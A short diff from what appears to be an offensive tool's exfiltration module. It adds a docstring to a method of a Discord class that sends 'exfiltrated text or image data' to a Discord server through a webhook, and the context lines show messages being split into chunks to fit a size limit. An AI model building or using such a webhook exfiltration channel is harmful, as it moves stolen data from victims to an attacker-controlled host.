@@ -56,6 +56,7 @@ class Discord(ExfiltrationModule):
             yield message[index: index + char_limit]
 
     async def _send_message(self, message: [str, BufferedReader]) -> None:
+        """Send exfiltrated text or image data to a Discord Server."""
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(url=self.webhook_url,
                                        adapter=AsyncWebhookAdapter(session))
